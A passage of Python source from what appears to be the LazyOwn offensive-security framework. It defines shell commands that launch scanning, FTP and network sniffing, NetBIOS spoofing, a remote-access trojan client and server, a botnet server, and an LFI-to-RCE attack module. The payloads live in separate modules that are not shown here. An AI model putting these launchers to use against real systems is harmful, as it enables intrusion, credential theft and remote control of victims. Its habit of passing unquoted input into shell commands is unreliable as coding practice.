                if len(line) <= optimal_width - 8:
                    wrapped_lines.append(line)
                else:
                    wrapped = textwrap.fill(line, width=optimal_width - 8, break_long_words=False, break_on_hyphens=False)
                    wrapped_lines.extend(wrapped.split('\n'))

            final_message = '\n'.join(wrapped_lines)
            num_lines = len(wrapped_lines)
        else:
            final_message = clean_message
            num_lines = len(lines)

        optimal_height = num_lines + 2

        panel = Panel(
            Text(final_message, style=style["text_style"], justify="left"),
            border_style=style["border_style"],
            width=optimal_width,
            padding=(0, 2),
            title=f"[bold]{type.upper()}[/bold]",
            title_align="center"
        )

        def show_toastr():
            self.console.print(panel, justify="center")

        threading.Thread(target=show_toastr, daemon=True).start()

    def _wrap_text(self, text, max_width):
        """Helper method to wrap text to fit within specified width."""
        import textwrap

        lines = text.split('\n')
        wrapped_lines = []

        for line in lines:
            if len(line) <= max_width:
                wrapped_lines.append(line)
            else:
                wrapped = textwrap.fill(line, width=max_width, break_long_words=True)
                wrapped_lines.extend(wrapped.split('\n'))

        return '\n'.join(wrapped_lines)

    def do_notify(self, arg):
        """Command to trigger a toastr-like notification.
        Usage: notify <type> <message>
        Example: notify success Implant checked in!
        """
        try:
            args = arg.split(maxsplit=1)
            if len(args) < 2:
                print_warn("Usage: notify <type> <message>")
                return
            type, message = args[0], args[1]
            if type.lower() not in ["success", "error", "warning", "info"]:
                print_error("Invalid type. Use: success, error, warning, info")
                return
            self.display_toastr(message, type=type)
        except Exception as e:
            print_error("Error:")


    def do_EOF(self, line):
        """
        Handle the end-of-file (EOF) condition.

        This method is called when the user sends an end-of-file (EOF) signal
        by pressing Ctrl+D. It is typically used to handle cleanup or exit
        operations when the user terminates input.

        In this implementation, it prints a farewell message and returns True
        to indicate that the shell should exit.

        License: This function is part of a program released under the GNU General
        Public License v3.0 (GPLv3). You can redistribute it and/or modify it
        under the terms of the GPLv3, as published by the Free Software Foundation.

        Note: This method is a part of the `cmd` library's command handling
        system. You can override it in a subclass to customize its behavior.

        Example:
            >>> shell = LazyOwnShell()
            >>> shell.do_EOF(None)
            LazyOwn say Goodbye!
            (shell exits)
        """
        print_warn("LazyOwn say Goodbye!")
        return True

    def postloop(self):
        """
        Handle operations to perform after exiting the command loop.

        This method is called after the command loop terminates, typically used
        for performing any final cleanup or displaying messages before the program
        exits.

        In this implementation, it prints a message indicating that the custom
        shell is exiting.

        License: This function is part of a program released under the GNU General
        Public License v3.0 (GPLv3). You can redistribute it and/or modify it
        under the terms of the GPLv3, as published by the Free Software Foundation.

        Note: This method is called automatically by the `cmd` library's command
        loop after the loop terminates. You can override it in a subclass to
        customize its behavior.

        Example:
            >>> shell = LazyOwnShell()
            >>> shell.cmdloop()  # Exits the command loop
            GoodBye LazyOwner
        """
        print_warn("GoodBye LazyOwner")

    @cmd2.with_category(miscellaneous_category)
    def do_assign(self, line):
        """
        assign a parameter value.

        This function takes a line of input, splits it into a parameter and a value,
        and assign the specified parameter to the given value if the parameter exists.

        :param line: A string containing the parameter and value to be set.
                    Expected format: '<parameter> <value>'.
        :type line: str
        :return: None
        :raises: ValueError if the input line does not contain exactly two elements.
        """
        args = shlex.split(line)
        if len(args) != 2:
            print_error(f"{YELLOW} Usage: assign <parameter> <value>{RESET}")
            return

        param, value = args
        if param in self.params:
            self.params[param] = value
            print_msg(f"{YELLOW}{param} assign to {GREEN}{value} {RESET}")
        else:
            print_error(f"Unknown parameter: {param}{RESET}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_show(self, line):
        """
        Show the current parameter values.

        This function iterates through the current parameters and their values,
        printing each parameter and its associated value.

        :param line: This parameter is not used in the function.
        :type line: str
        :return: None
        """
        for param, value in self.params.items():
            print_msg(f"{param}: {value}")

    @cmd2.with_category(miscellaneous_category)
    def do_list(self, line):
        """
        Lists all available scripts in the modules directory.

        This method prints a list of available scripts in a formatted manner, arranging
        them into columns. It shows each script with sufficient spacing for readability.

        :param line: This parameter is not used in the method.
        :type line: str
        :return: None
        """

        scripts = self.scripts
        num_columns = 3

        if not scripts:
            print_error(f"No available scripts.{RESET}")
            return

        max_len = max(len(script) for script in scripts)
        column_width = max_len + 2

        rows = [
            scripts[i : i + num_columns] for i in range(0, len(scripts), num_columns)
        ]

        print_msg(f"Available scripts to run:{RESET}")
        for row in rows:
            print_msg(
                f"   ".join(
                    f"{script.ljust(column_width)}{RESET}    " for script in row
                )
            )


    @cmd2.with_category(miscellaneous_category)
    def do_run(self, line):
        """
        Runs a specific LazyOwn script.

        This method executes a script from the LazyOwn toolkit based on the provided
        script name. If the script is not recognized, it prints an error message.
        To see available scripts, use the `list` or `help list` commands.

        :param line: The command line input containing the script name.
        :type line: str
        :return: None
        """

        args = shlex.split(line)
        if not args:
            print_error(f"Usage: {GREEN} run <script_name> {RESET}")
            return

        script_name = args[0]
        if script_name in self.scripts:
            getattr(self, f"run_{script_name}")()
        else:
            print_error(f"Unknown script: {CYAN}{script_name}{RESET}")

    @cmd2.with_category(recon_category)
    def run_lazysearch(self):
        """
        Runs the internal module `modules/lazysearch.py`.

        This method executes the `lazysearch` script from the specified path, using
        the `binary_name` parameter from the `self.params` dictionary. If `binary_name`
        is not set, it prints an error message.

        :return: None
        """
        binary_name = self.params["binary_name"]
        if not binary_name:
            print_error("binary_name not set")
            return
        self.run_script("modules/lazysearch.py", binary_name)

    @cmd2.with_category(recon_category)
    def run_lazysearch_gui(self):
        """
        Run the internal module located at `modules/LazyOwnExplorer.py`.

        This method executes the `LazyOwnExplorer.py` script, which is used for graphical user interface (GUI) functionality within the LazyOwn framework.

        The function performs the following steps:

        1. Calls `self.run_script` with `LazyOwnExplorer.py` to execute the GUI module.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/LazyOwnExplorer.py` script is present in the `modules` directory.
        2. Run the script with:
            `python3 modules/LazyOwnExplorer.py`

        Example:
            To run `LazyOwnExplorer.py` directly, execute:
            `python3 modules/LazyOwnExplorer.py`

        Note:
            - Ensure that the script has the appropriate permissions and dependencies to run.
            - Verify that your environment supports GUI operations if using this script in a non-graphical environment.
        """

        self.run_script("modules/LazyOwnExplorer.py")
        return

    @cmd2.with_category(scanning_category)
    def run_lazyown(self):
        """
        Run the internal module located at `modules/lazyown.py`.

        This method executes the `lazyown.py` script, which is a core component of the LazyOwn framework.

        The function performs the following steps:

        1. Calls `self.run_script` with `lazyown.py` to execute the script.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/lazyown.py` script is present in the `modules` directory.
        2. Run the script with:
            `python3 modules/lazyown.py`

        Example:
            To run `lazyown.py` directly, execute:
            `python3 modules/lazyown.py`

        Note:
            - Ensure that the script has the appropriate permissions and dependencies to run.
        """

        self.run_script("modules/lazyown.py")
        return

    @cmd2.with_category(miscellaneous_category)
    def run_update_db(self):
        """
        Run the internal module located at `modules/update_db.sh`.

        This method executes the `update_db.sh` script to update the database of binary exploitables from `gtofbins`.

        The function performs the following steps:

        1. Executes the `update_db.sh` script located in the `modules` directory using `os.system`.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/update_db.sh` script is present in the `modules` directory.
        2. Run the script with:
            `./modules/update_db.sh`

        Example:
            To manually update the database, execute:
            `./modules/update_db.sh`

        Note:
            - Ensure that the script has execute permissions.
            - The script should be run with the necessary privileges if required.
        """

        self.cmd("./modules/update_db.sh")
        return

    @cmd2.with_category(scanning_category)
    def run_lazynmap(self):
        """
        Runs the internal module `modules/lazynmap.sh` for multiple Nmap scans.

        This method executes the `lazynmap` script, using the current working directory
        and the `rhost` parameter from the `self.params` dictionary as the target IP.
        If `rhost` is not set, it prints an error message.

        :return: None
        """

        path = os.getcwd()
        target_ip = self.params["rhost"]
        if not target_ip:
            print_error(f"rhost must be assign, {GREEN}help assign to more info {RESET}")
            return
        self.cmd(f"{path}/modules/lazynmap.sh -t {target_ip}")
        self.onecmd("vulnbot_groq")
        self.onecmd("report")
        return

    @cmd2.with_category(scanning_category)
    def do_batchnmap(self, line):
        """
        Runs the internal module `modules/lazynmap.sh` for multiple Nmap scans.

        This method executes the `lazynmap` script, using the current working directory
        and the `rhost` parameter from the `self.params` dictionary as the target IP.
        If `rhost` is not set, it prints an error message.

        :return: None
        """

        file_path = get_users_dic('txt')
        path = os.getcwd()
        try:
            with open(file_path, 'r') as file:
                for target in file:
                    target = target.strip()
                    if target:
                        self.cmd(f"{path}/modules/lazynmap.sh -t {target}")
        except FileNotFoundError:
            self.perror(f"File not found: {file_path}")
        except Exception as e:
            self.perror(f"An error occurred: {e}")


        return

    @cmd2.with_category(scanning_category)
    def run_lazywerkzeugdebug(self):
        """
        Run the internal module located at `modules/lazywerkzeug.py` in debug mode.

        This method executes the `lazywerkzeug.py` script with the specified parameters for remote and local hosts and ports. It is used to test Werkzeug in debug mode.

        The function performs the following steps:

        1. Retrieves the `rhost`, `lhost`, `rport`, and `lport` values from `self.params`.
        2. Checks if all required parameters are set. If not, prints an error message and returns.
        3. Calls `self.run_script` with `lazywerkzeug.py` and the specified parameters.

        :param rhost: The remote host address.
        :type rhost: str

        :param lhost: The local host address.
        :type lhost: str

        :param rport: The remote port number.
        :type rport: int

        :param lport: The local port number.
        :type lport: int

        :returns: None

        Manual execution:
        1. Ensure that `rhost`, `lhost`, `rport`, and `lport` are assign in `self.params`.
        2. The script `modules/lazywerkzeug.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazywerkzeug.py <rhost> <rport> <lhost> <lport>`

        Example:
            To run `lazywerkzeug.py` with `rhost` assign to `"127.0.0.1"`, `rport` to `5000`, `lhost` to `"localhost"`, and `lport` to `8000`, set:
            `self.params["rhost"] = "127.0.0.1"`
            `self.params["rport"] = 5000`
            `self.params["lhost"] = "localhost"`
            `self.params["lport"] = 8000`
            Then call:
            `run_lazywerkzeugdebug()`

        Note:
            - Ensure that `modules/lazywerkzeug.py` has the appropriate permissions and dependencies to run.
            - Verify that the specified hosts and ports are correct and available.
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        rport = self.params["rport"]
        lport = self.params["lport"]
        if not rhost or not lhost or not lport or not rport:
            print_error(
                "rhost, lhost, rpor, and lport must be assign, to more info see: help set"
            )
            return
        self.run_script("modules/lazywerkzeug.py", rhost, rport, lhost, lport)
        return

    @cmd2.with_category(scanning_category)
    def run_lazygath(self):
        """
        Run the internal module located at `modules/lazygat.sh`. to gathering the sistem :)

        This method executes the `lazygat.sh` script located in the `modules` directory with `sudo` privileges.

        The function performs the following steps:

        1. Retrieves the current working directory.
        2. Executes the `lazygat.sh` script using `sudo` to ensure it runs with elevated permissions.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/lazygat.sh` script is present in the `modules` directory.
        2. Run the script with:
            `sudo ./modules/lazygat.sh`

        Example:
            To manually run the script with elevated privileges, execute:
            `sudo ./modules/lazygat.sh`

        Note:
            - Ensure that the script has execute permissions.
            - The script should be run with `sudo` if it requires elevated privileges.
        """

        path = os.getcwd()
        self.cmd(f"sudo {path}/modules/lazygat.sh")
        return

    @cmd2.with_category(scanning_category)
    def run_lazynmapdiscovery(self):
        """
        Runs the internal module `modules/lazynmap.sh` with discovery mode.

        This method executes the `lazynmap` script in discovery mode. It uses the current
        working directory for locating the script.

        :return: None
        """

        path = os.getcwd()
        self.cmd(f"{path}/modules/lazynmap.sh -d")
        return

    @cmd2.with_category(scanning_category)
    def do_lazynmap(self, line):
        """
        Runs the internal module `modules/lazynmap.sh` with target mode.

        This method executes the `lazynmap` script in target mode. It uses the current
        working directory for locating the script.

        :param line: The network ip to be used for scanning.
        :type line: str

        :return: None
        """
        if not line:
            line = self.params["rhost"]
        path = os.getcwd()
        self.cmd(f"{path}/modules/lazynmap.sh -t {line}")
        self.onecmd("vulnbot_groq")
        self.onecmd("report")
        return

    @cmd2.with_category(scanning_category)
    def run_lazysniff(self):
        """
        Run the sniffer internal module located at `modules/lazysniff.py` with the specified parameters.

        This method executes the script with the following arguments:

        - `device`: The network interface to be used for sniffing, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `device` value from `self.params`.
        2. Sets up the environment variables `LANG` and `TERM` to ensure proper script execution.
        3. Uses `subprocess.run` to execute the `lazysniff.py` script with the `-i` option to specify the network interface.

        :param device: The network interface to be used for sniffing.
        :type device: str

        :returns: None

        Manual execution:
        1. Ensure that `device` is assign in `self.params`.
        2. The script `modules/lazysniff.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazysniff.py -i <device>`

        Example:
            To run `lazysniff` with `device` assign to `"eth0"`, set:
            `self.params["device"] = "eth0"`
            Then call:
            `run_lazysniff()`

        Note:
            - Ensure that `modules/lazysniff.py` has the appropriate permissions and dependencies to run.
            - Ensure that the network interface specified is valid and properly configured.
        """


        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        device = self.params["device"]
        subprocess.run(
            ["python3", "modules/lazysniff.py", "-i", device],
            env=env,
            stdin=sys.stdin,
            stdout=sys.stdout,
            stderr=sys.stderr,
        )

    @cmd2.with_category(scanning_category)
    def run_lazyftpsniff(self):
        """
        Run the sniffer ftp internal module located at `modules/lazyftpsniff.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `device`: The network interface to be used for sniffing, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `device` value from `self.params`.
        2. Sets up the environment variables `LANG` and `TERM` to ensure proper script execution.
        3. Uses `subprocess.run` to execute the `lazyftpsniff.py` script with the `-i` option to specify the network interface.

        :param device: The network interface to be used for sniffing.
        :type device: str

        :returns: None

        Manual execution:
        1. Ensure that `device` is assign in `self.params`.
        2. The script `modules/lazyftpsniff.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyftpsniff.py -i <device>`

        Example:
            To run `lazyftpsniff` with `device` assign to `"eth0"`, set:
            `self.params["device"] = "eth0"`
            Then call:
            `run_lazyftpsniff()`

        Note:
            - Ensure that `modules/lazyftpsniff.py` has the appropriate permissions and dependencies to run.
            - Ensure that the network interface specified is valid and properly configured.
        """

        device = self.params["device"]
        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        if not device:
            print_error("device must be assign to choice the interface")
            return
        subprocess.run(["python3", "modules/lazyftpsniff.py", "-i", device])

    @cmd2.with_category(scanning_category)
    def run_lazynetbios(self):
        """
        Run the internal module to search netbios vuln victims, located at `modules/lazynetbios.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `startip`: The starting IP address for the NetBIOS scan, specified in `self.params`.
        - `endip`: The ending IP address for the NetBIOS scan, specified in `self.params`.
        - `spoof_ip`: The IP address to be used for spoofing, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `startip`, `endip`, and `spoof_ip` values from `self.params`.
        2. Uses `subprocess.run` to execute the `lazynetbios.py` script with the specified parameters.

        :param startip: The starting IP address for the NetBIOS scan.
        :type startip: str

        :param endip: The ending IP address for the NetBIOS scan.
        :type endip: str

        :param spoof_ip: The IP address to be used for spoofing.
        :type spoof_ip: str

        :returns: None

        Manual execution:
        1. Ensure that `startip`, `endip`, and `spoof_ip` are assign in `self.params`.
        2. The script `modules/lazynetbios.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazynetbios.py <startip> <endip> <spoof_ip>`

        Example:
            To run `lazynetbios` with `startip` assign to `"192.168.1.1"`, `endip` assign to `"192.168.1.10"`, and `spoof_ip` assign to `"192.168.1.100"`, assign:
            `self.params["startip"] = "192.168.1.1"`
            `self.params["endip"] = "192.168.1.10"`
            `self.params["spoof_ip"] = "192.168.1.100"`
            Then call:
            `run_lazynetbios()`

        Note:
            - Ensure that `modules/lazynetbios.py` has the appropriate permissions and dependencies to run.
            - Ensure that the IP addresses are correctly set and valid for the NetBIOS scan.
        """

        startip = self.params["startip"]
        endip = self.params["endip"]
        spoof_ip = self.params["spoof_ip"]
        subprocess.run(["python3", "modules/lazynetbios.py", startip, endip, spoof_ip])

    @cmd2.with_category(recon_category)
    def run_lazyhoneypot(self):
        """
        Run the internal module located at `modules/lazyhoneypot.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `email_from`: The email address from which messages will be sent, specified in `self.params`.
        - `email_to`: The recipient email address, specified in `self.params`.
        - `email_username`: The username for email authentication, specified in `self.params`.
        - `email_password`: The password for email authentication, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `email_from`, `email_to`, `email_username`, and `email_password` values from `self.params`.
        2. Calls the `run_script` method to execute the `lazyhoneypot.py` script with the provided email parameters.

        :param email_from: The email address from which messages will be sent.
        :type email_from: str

        :param email_to: The recipient email address.
        :type email_to: str

        :param email_username: The username for email authentication.
        :type email_username: str

        :param email_password: The password for email authentication.
        :type email_password: str

        :returns: None

        Manual execution:
        1. Ensure that `email_from`, `email_to`, `email_username`, and `email_password` are assign in `self.params`.
        2. The script `modules/lazyhoneypot.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyhoneypot.py --email_from <email_from> --email_to <email_to> --email_username <email_username> --email_password <email_password>`

        Example:
            To run `lazyhoneypot` with `email_from` assign to `"sender@example.com"`, `email_to` assign to `"recipient@example.com"`, `email_username` assign to `"user"`, and `email_password` assign to `"pass"`, set:
            `self.params["email_from"] = "sender@example.com"`
            `self.params["email_to"] = "recipient@example.com"`
            `self.params["email_username"] = "user"`
            `self.params["email_password"] = "pass"`
            Then call:
            `run_lazyhoneypot()`

        Note:
            - Ensure that `modules/lazyhoneypot.py` has the appropriate permissions and dependencies to run.
            - Ensure that the email credentials are correctly set for successful authentication and operation.
        """

        email_from = self.params["email_from"]
        email_to = self.params["email_to"]
        email_username = self.params["email_username"]
        email_password = self.params["email_password"]
        self.run_script(
            "modules/lazyhoneypot.py",
            "--email_from",
            email_from,
            "--email_to",
            email_to,
            "--email_username",
            email_username,
            "--email_password",
            email_password,
        )
    @cmd2.with_category(reporting_category)
    def do_gpt(self, line):
        """
        Run the internal module to create Oneliners with Groq AI located at `modules/lazygptcli.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `prompt`: The prompt to be used by the script, specified in `self.params`.
        - `api_key`: The API key to be assign in the environment variable `GROQ_API_KEY`, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `prompt` and `api_key` values from `self.params`.
        2. Checks if both `prompt` and `api_key` are assign. If either is missing, it prints an error message and returns.
        3. Sets the environment variable `GROQ_API_KEY` with the provided `api_key`.
        4. Calls the `run_script` method to execute the `lazygptcli.py` script with the `--prompt` argument.

        :param prompt: The prompt to be used by the script.
        :type prompt: str

        :param api_key: The API key for accessing the service.
        :type api_key: str

        :returns: None

        Manual execution:
        1. Ensure that `prompt` and `api_key` are assign in `self.params`.
        2. The script `modules/lazygptcli.py` should be present in the `modules` directory.
        3. assign the environment variable `GROQ_API_KEY` with the API key value.
        4. Run the script with:
            `python3 modules/lazygptcli.py --prompt <prompt>`

        Example:
            To run `lazygptcli` with `prompt` assign to `"Your prompt"` and `api_key` assign to `"your_api_key"`, set:
            `self.params["prompt"] = "Your prompt"`
            `self.params["api_key"] = "your_api_key"`
            Then call:
            `run_lazygptcli()`

        Note:
            - Ensure that `modules/lazygptcli.py` has the appropriate permissions and dependencies to run.
            - The environment variable `GROQ_API_KEY` must be correctly assign for the script to function.
        """
        if not line:
            prompt = self.params["prompt"]
        else:
            prompt = line.strip()
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print_error("Prompt and api_key must be assign")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.cmd(f"python3 modules/lazygptcli.py --prompt '{prompt}'")

    def run_lazysearch_bot(self):
        """
        Run the internal module GROQ AI located at `modules/lazysearch_bot.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `prompt`: The prompt to be used by the script, specified in `self.params`.
        - `api_key`: The API key to be assign in the environment variable `GROQ_API_KEY`, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `prompt` and `api_key` values from `self.params`.
        2. Checks if both `prompt` and `api_key` are assign. If either is missing, it prints an error message and returns.
        3. Sets the environment variable `GROQ_API_KEY` with the provided `api_key`.
        4. Calls the `run_script` method to execute the `lazysearch_bot.py` script with the `--prompt` argument.

        :param prompt: The prompt to be used by the script.
        :type prompt: str

        :param api_key: The API key for accessing the service.
        :type api_key: str

        :returns: None

        Manual execution:
        1. Ensure that `prompt` and `api_key` are assign in `self.params`.
        2. The script `modules/lazysearch_bot.py` should be present in the `modules` directory.
        3. Set the environment variable `GROQ_API_KEY` with the API key value.
        4. Run the script with:
            `python3 modules/lazysearch_bot.py --prompt <prompt>`

        Example:
            To run `lazysearch_bot` with `prompt` assign to `"Search query"` and `api_key` assign to `"your_api_key"`, assign:
            `self.params["prompt"] = "Search query"`
            `self.params["api_key"] = "your_api_key"`
            Then call:
            `run_lazysearch_bot()`

        Note:
            - Ensure that `modules/lazysearch_bot.py` has the appropriate permissions and dependencies to run.
            - The environment variable `GROQ_API_KEY` must be correctly assign for the script to function.
        """

        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print_error("Prompt and api_key must be assign")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazysearch_bot.py", "--prompt", prompt)

    def run_lazymetaextract0r(self):
        """
        Run the Metadata extractor internal module located at `modules/lazyown_metaextract0r.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `path`: The file path to be processed by the script, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the value for `path` from `self.params`.
        2. Checks if the `path` parameter is assign. If not, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazyown_metaextract0r.py` script with the appropriate argument.

        :param path: The file path to be processed by the script.
        :type path: str

        :returns: None

        Manual execution:
        1. Ensure that `path` is assign in `self.params`.
        2. The script `modules/lazyown_metaextract0r.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyown_metaextract0r.py --path <path>`

        Example:
            To run `lazyown_metaextract0r` with `path` assign to `/home/user/file.txt`, set:
            `self.params["path"] = "/home/user/file.txt"`
            Then call:
            `run_lazymetaextract0r()`

        Note:
            - Ensure that `modules/lazyown_metaextract0r.py` has the appropriate permissions and dependencies to run.
        """

        path = self.params["path"]
        if not path:
            print_error("Path must be assign")
            return
        self.run_script("modules/lazyown_metaextract0r.py", "--path", path)

    def run_lazyownratcli(self):
        """
        Run the internal module located at `modules/lazyownclient.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `lhost`: The IP address of the local host, specified in `self.params`.
        - `lport`: The port number of the local host, specified in `self.params`.
        - `rat_key`: The RAT key, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `lhost`, `lport`, and `rat_key` from `self.params`.
        2. Checks if all required parameters (`lhost`, `lport`, and `rat_key`) are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazyownclient.py` script with the appropriate arguments.

        :param lhost: The IP address of the local host.
        :type lhost: str
        :param lport: The port number of the local host.
        :type lport: int
        :param rat_key: The RAT key.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `lhost`, `lport`, and `rat_key` are assign in `self.params`.
        2. The script `modules/lazyownclient.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyownclient.py --host <lhost> --port <lport> --key <rat_key>`

        Example:
            To run `lazyownclient` with `lhost` assign to `192.168.1.10`, `lport` assign to `8080`, and `rat_key` assign to `my_secret_key`, set:
            `self.params["lhost"] = "192.168.1.10"`
            `self.params["lport"] = 8080`
            `self.params["rat_key"] = "my_secret_key"`
            Then call:
            `run_lazyownratcli()`

        Note:
            - Ensure that `modules/lazyownclient.py` has the appropriate permissions and dependencies to run.
        """
        rhost = self.params["rhost"]
        rport = self.params["rport"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rat_key = self.params["rat_key"]
        if not lhost or not lport or not rat_key:
            print_error("lhost and lport and rat_key must be assign")
            return
        self.run_script(
            "modules/lazyownclient.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazyownrat(self):
        """
        Run the internal module located at `modules/lazyownserver.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, specified in `self.params`.
        - `rport`: The port number of the remote host, specified in `self.params`.
        - `rat_key`: The RAT key, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rhost`, `rport`, and `rat_key` from `self.params`.
        2. Checks if all required parameters (`rhost`, `rport`, and `rat_key`) are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazyownserver.py` script with the appropriate arguments.

        :param rhost: The IP address of the remote host.
        :type rhost: str
        :param rport: The port number of the remote host.
        :type rport: int
        :param rat_key: The RAT key.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost`, `rport`, and `rat_key` are assign in `self.params`.
        2. The script `modules/lazyownserver.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyownserver.py --host <rhost> --port <rport> --key <rat_key>`

        Example:
            To run `lazyownserver` with `rhost` set to `192.168.1.10`, `rport` assign to `8080`, and `rat_key` assign to `my_secret_key`, set:
            `self.params["rhost"] = "192.168.1.10"`
            `self.params["rport"] = 8080`
            `self.params["rat_key"] = "my_secret_key"`
            Then call:
            `run_lazyownrat()`

        Note:
            - Ensure that `modules/lazyownserver.py` has the appropriate permissions and dependencies to run.
        """

        rhost = self.params["rhost"]
        rport = self.params["rport"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be assign")
            return
        self.run_script(
            "modules/lazyownserver.py",
            "--host",
            lhost,
            "--port",
            str(lport),
            "--key",
            rat_key,
        )

    def run_lazybotnet(self):
        """
        Run the internal module located at `modules/lazybotnet.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, hardcoded to "0.0.0.0".
        - `rport`: The port number of the remote host, specified in `self.params`.
        - `rat_key`: The RAT key, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rport` and `rat_key` from `self.params`. The `rhost` is hardcoded to "0.0.0.0".
        2. Checks if all required parameters (`rport` and `rat_key`) are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazybotnet.py` script with the appropriate arguments.

        :param rport: The port number of the remote host.
        :type rport: int
        :param rat_key: The RAT key.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `rport` and `rat_key` are assign in `self.params`.
        2. The script `modules/lazybotnet.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazybotnet.py --host <rhost> --port <rport> --key <rat_key>`

        Example:
            To run `lazybotnet` with `rport` assign to `1234` and `rat_key` assign to `my_key`, assign:
            `self.params["rport"] = 1234`
            `self.params["rat_key"] = "my_key"`
            Then call:
            `run_lazybotnet()`

        Note:
            - Ensure that `modules/lazybotnet.py` has the appropriate permissions and dependencies to run.
        """

        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be assign")
            return
        self.run_script(
            "modules/lazybotnet.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazylfi2rce(self):
        """
        Run the internal module located at `modules/lazylfi2rce.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, specified in `self.params`.
        - `rport`: The port number of the remote host, specified in `self.params`.
        - `lhost`: The IP address of the local host, specified in `self.params`.
        - `lport`: The port number of the local host, specified in `self.params`.
        - `field`: The field name for the LFI (Local File Inclusion) attack, specified in `self.params`.
        - `wordlist`: The path to the wordlist file used for the attack, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rhost`, `rport`, `lhost`, `lport`, `field`, and `wordlist` from `self.params`.
        2. Checks if all required parameters are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazylfi2rce.py` script with the appropriate arguments.

        :param rhost: The IP address of the remote host.
        :type rhost: str
        :param rport: The port number of the remote host.
        :type rport: int
        :param lhost: The IP address of the local host.
        :type lhost: str
        :param lport: The port number of the local host.
        :type lport: int
        :param field: The field name for the LFI attack.
        :type field: str
        :param wordlist: The path to the wordlist file.
        :type wordlist: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost`, `rport`, `lhost`, `lport`, `field`, and `wordlist` are assign in `self.params`.
        2. The script `modules/lazylfi2rce.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazylfi2rce.py --rhost <rhost> --rport <rport> --lhost <lhost> --lport <lport> --field <field> --wordlist <wordlist>`

        Example:
            To run the lazylfi2rce with `rhost` assign to `192.168.1.1`, `rport` assign to `80`, `lhost` assign to `192.168.1.2`, `lport` assign to `8080`, `field` assign to `file`, and `wordlist` assign to `path/to/wordlist.txt`, set:
            `self.params["rhost"] = "192.168.1.1"`
            `self.params["rport"] = 80`
            `self.params["lhost"] = "192.168.1.2"`
            `self.params["lport"] = 8080`
            `self.params["field"] = "file"`
            `self.params["wordlist"] = "path/to/wordlist.txt"`
            Then call:
            `run_lazylfi2rce()`

        Note:
            - Ensure that `modules/lazylfi2rce.py` has the appropriate permissions and dependencies to run.
        """

        rhost = self.params["rhost"]
        rport = self.params["rport"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        field = self.params["field"]
        wordlist = self.params["wordlist"]

        if (
            not rhost
            or not rport
            or not lhost
            or not lport
            or not field
            or not wordlist
        ):
            print_error("rhost and rport field and lhost lport wordlist must be assign")
            return
        self.run_script(
            "modules/lazylfi2rce.py",
            "--rhost",
            rhost,
            "--rport",
            str(rport),
            "--lhost",
            lhost,
            "--lport",
            str(lport),
            "--field",
            field,
            "--wordlist",
            wordlist,
        )

    def run_lazylogpoisoning(self):
        """
